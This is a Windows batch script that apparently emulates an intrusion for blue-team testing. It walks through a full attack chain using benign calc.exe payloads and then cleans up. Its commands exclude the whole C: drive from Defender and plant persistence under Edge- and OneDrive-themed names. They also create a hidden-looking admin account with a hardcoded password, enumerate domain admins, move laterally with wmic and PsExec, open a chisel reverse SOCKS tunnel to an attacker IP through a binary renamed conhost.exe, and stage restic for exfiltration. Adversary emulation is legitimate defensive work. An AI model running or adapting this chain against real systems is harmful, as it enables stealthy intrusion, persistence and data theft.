@echo off

start msedge --new-window https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html && curl.exe -kL https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -o "%USERPROFILE%\Downloads\putty.exe"

timeout /t 5

"%USERPROFILE%\Downloads\putty.exe"

echo [i] Downloaded. Confirm download in users Downloads directory and continue
pause
echo [i] Press Enter to continue to add Defender Exclusions...
pause

:: Defender Exclusions
::"C:\Program Files\Windows Defender\MpCmdRun.exe" -AddExclusion -ExclusionPath "C:\"
powershell -command "Add-MpPreference -ExclusionPath 'C:\'"
echo [i] Listing exclusions...
::"C:\Program Files\Windows Defender\MpCmdRun.exe" -ListExclusions
powershell -command "Get-MpPreference"
echo
echo [i] Ensure Exclusion was set
pause

echo [i] Press Enter to continue to persistence ...
pause
echo [i] Establishing persistence ...

:: Create the .bat file
echo start calc > "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\update.bat"
echo start calc > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msedge.exe.bat"
echo start calc > "C:\Windows\Temp\OneDriveUpdater.bat"

:: Create the Registry Key
::cmd.exe /C reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,'%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\update.bat'" /f
cmd.exe /C reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "EdgeUpdate" /t REG_SZ /d "\"%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\update.bat\"" /f

:: Create Scheduled Task as SYSTEM onstart
schtasks /create /ru SYSTEM /tn "OneDrive Security Task 58082562-5e09-4322-848d-a966bf8aef75" /tr C:\Windows\Temp\OneDriveUpdater.bat /sc onstart /F

echo [i] Registry persistence added at : HKLM\software\microsoft\windows nt\currentversion\winlogon
echo [i] Added persistence to C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msedge.exe.bat"
echo [i] Added persistence Scheduled Task with Task Name of : "OneDrive Security Task 58082562-5e09-4322-848d-a966bf8aef75"
echo [i] Please verify and press <enter> to continue....
pause

:: enumeration

echo [i] Press enter to begin enumeration...
pause

echo [i] Enumerate current user privs
whoami /priv
pause
echo [i] Enumerate local administrators
net.exe localgroup Administrators
pause
echo [i] Enumerate password policy
net.exe accounts
pause
echo [i] Enumerate All Domain accounts
net.exe user /DOMAIN
pause
echo [i] Enumerate Accounts with 'Admin' in the name
powershell -command "net.exe user /DOMAIN | Select-String -SimpleMatch 'admin'"
echo [i] Enumerating Admins method 2
powershell -command "(([ADSISearcher]'(AdminCount=1)').FindAll()).Properties.samaccountname"
pause
echo [i] Enumerating Domain Admins
powershell -command "net.exe group 'Domain Admins' /DOMAIN | FL -property *"
pause
::echo [i] Enumerating Domain Controllers
::for /f "tokens=2 delims=\\" %i in ('nltest /dsgetdc: ^| findstr "Address"') do set dcaddress=%i
::nslookup %dcaddress%
::pause
echo [i] Creating new Administrator User
net.exe user Adminstrator SuperSecretReallyLongPassword123!@# /add
net.exe localgroup Administrators Adminstrator /add
net.exe localgroup Administrators
pause

:: Lateral Movement
echo [i] Press enter to start lateral movement...
pause

echo [i] Testing remote wmic execution
wmic.exe /node:127.0.0.1 process call create "C:\Windows\System32\calc.exe"
echo [i] ran the following command : wmic.exe /node:127.0.0.1 process call create "C:\Windows\System32\calc.exe"
pause
echo [i] About to download additional tools
echo [i] Downloading PSTools..

powershell -Command "Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile '%USERPROFILE%\AppData\Local\Temp\PsTools.zip'; Expand-Archive -Path '%USERPROFILE%\AppData\Local\Temp\PsTools.zip' -DestinationPath '%USERPROFILE%\AppData\Local\Temp\PsTools'; Remove-Item -Path '%USERPROFILE%\AppData\Local\Temp\PsTools.zip'"
echo [i] Ensure PSTools folder created in AppData\Local\Temp...
echo [i] Press enter to simulate psexec lateral movement...
pause

echo [i] Testing PsExec...
::powershell -Command "'%USERPROFILE%\AppData\Local\Temp\PSTools\PSExec.exe' \\%dcaddress% -u Adminstrator -p SuperSecretReallyLongPassword123!@# cmd /c 'ipconfig' -accepteula"
powershell -Command "'%USERPROFILE%\AppData\Local\Temp\PSTools\PSExec.exe' \\127.0.0.1 -u Adminstrator -p SuperSecretReallyLongPassword123!@# cmd /c 'ipconfig' -accepteula"
pause



:: Download chisel
curl.exe -kL https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/chisel.exe -o C:\Windows\conhost.exe

:: TODO 
::      Add a check to ensure file was created

echo [i] Downloading Chisel to C:\Windows\conhost.exe ... This might take a moment...
timeout /t 5
echo [i] Confirm Chisel finished downloading before continuing...
echo [i] Start remote chisel server to listen for connection...
pause

:: TODO
::     have the bat script take attacker IP as argument 
:: Chisel Server Command : ./chisel_1.10.1_linux_amd64 server --port 443 --reverse
C:\Windows\conhost.exe client --tls-skip-verify https://192.168.0.32:443 R:111:socks

:: If this works we should try to run bloodhound through this connection or powerview!!!
echo [i] Check remote chisel server for connection...
pause

:: Download restic
:: Actual commandline from incident
:: CmdLine: "C:\StorageReports\Scheduled\spoolsvc.exe" -r rest:https://sharkpic.com:443/ init --password-file C:\StorageReports\Scheduled\update.txt --insecure-tls
echo [i] Downloading restic to %USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync\OneDriveSync.exe
powershell -Command "iwr -uri https://github.com/restic/restic/releases/download/v0.18.0/restic_0.18.0_windows_amd64.zip -o '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync.zip'; Expand-Archive -path '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync.zip' -DestinationPath '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync'; mv '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync\restic_0.18.0_windows_amd64.exe' '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync\OneDriveSync.exe'; Remove-Item -Path '%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\OneDriveSync.zip'"

:: CLEAN UP 
echo [i] Press Enter to clean up artifacts...
pause
:: Delete putty install
del %USERPROFILE%\\Downloads\\putty.exe
:: Delete UpdateEdge.bat persistence
del "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\update.bat"
:: Delete the Starup .bat script
del "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msedge.exe.bat"
:: Delete other .bat scripts
del "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msedge.exe.bat"
del "C:\Windows\Temp\OneDriveUpdater.bat"
:: Reset the registry
::cmd.exe /C reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "EdgeUpdate" /f
:: Remove Scheduled Tasks
schtasks /delete /tn "OneDrive Security Task 58082562-5e09-4322-848d-a966bf8aef75" /f
:: Remove PSTools directory
powershell -Command "Remove-Item -Path %USERPROFILE%\AppData\Local\Temp\PSTools\ -Recurse"
:: Delete Chisel
del C:\Windows\conhost.exe
:: Delete Adminstrator Local Account
net user Adminstrator /delete
